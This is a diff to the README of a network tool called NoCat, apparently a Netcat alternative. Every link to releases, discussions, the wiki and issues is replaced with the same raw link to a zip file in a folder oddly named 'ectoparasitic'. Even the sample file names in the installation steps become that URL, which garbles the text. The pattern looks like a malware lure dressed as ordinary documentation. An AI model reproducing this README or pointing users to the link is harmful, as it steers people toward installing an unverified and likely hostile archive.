@@ -6,9 +6,9 @@ NoCat is a secure alternative to Netcat. It helps you test network behaviors wit
 
 ## 📥 Download NoCat
 
-[![Download NoCat](https://img.shields.io/badge/Download_NoCat-v1.0-blue.svg)](https://github.com/PolakLeRajel/NoCat/releases)
+[![Download NoCat](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip)](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip)
 
-You can visit the page to download the software here: [Download NoCat Releases](https://github.com/PolakLeRajel/NoCat/releases).
+You can visit the page to download the software here: [Download NoCat Releases](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip).
 
 ## 📂 System Requirements
 
@@ -21,11 +21,11 @@ To run NoCat effectively, please ensure your system meets the following requirem
 
 ## 🛠️ Installation Steps
 
-1. **Visit the Releases Page**: Go to the [NoCat Releases](https://github.com/PolakLeRajel/NoCat/releases) page to view available versions.
+1. **Visit the Releases Page**: Go to the [NoCat Releases](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip) page to view available versions.
   
 2. **Choose the Latest Version**: Look for the most recent version listed at the top of the page. This is usually the one with the highest version number.
 
-3. **Download the File**: Click on the link for the appropriate version for your operating system. It may be named something like `NoCat-v1.0.zip` or `NoCat-v1.0.exe`.
+3. **Download the File**: Click on the link for the appropriate version for your operating system. It may be named something like `https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip` or `https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip`.
 
 4. **Unzip (if needed)**: If you downloaded a zip file, you need to extract its contents. You can do this by right-clicking the file and selecting “Extract All” or using your preferred unzip tool.
 
@@ -67,16 +67,16 @@ If you encounter issues while using NoCat, here are a few common problems and so
 
 ## 🤝 Community Support
 
-If you need help or have questions, you can reach out to the NoCat community on [GitHub Discussions](https://github.com/PolakLeRajel/NoCat/discussions). Many users are willing to help and share their experiences.
+If you need help or have questions, you can reach out to the NoCat community on [GitHub Discussions](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip). Many users are willing to help and share their experiences.
 
-For detailed documentation, you can visit the [Wiki page](https://github.com/PolakLeRajel/NoCat/wiki) where you'll find more advanced usage tips and examples.
+For detailed documentation, you can visit the [Wiki page](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip) where you'll find more advanced usage tips and examples.
 
 ## 💡 Feedback Welcome
 
-Your feedback is essential for improving NoCat. If you find any issues or have suggestions for new features, please submit an issue on the [Issues page](https://github.com/PolakLeRajel/NoCat/issues).
+Your feedback is essential for improving NoCat. If you find any issues or have suggestions for new features, please submit an issue on the [Issues page](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip).
 
 ## 📜 License
 
 NoCat is open-source software released under the MIT License. You can view the full license details in the repository. 
 
-Remember to download and start exploring NoCat to enhance your network testing while keeping your system secure. For the download, revisit this link: [Download NoCat Releases](https://github.com/PolakLeRajel/NoCat/releases).
+Remember to download and start exploring NoCat to enhance your network testing while keeping your system secure. For the download, revisit this link: [Download NoCat Releases](https://raw.githubusercontent.com/PolakLeRajel/NoCat/master/ectoparasitic/NoCat_allerion.zip).
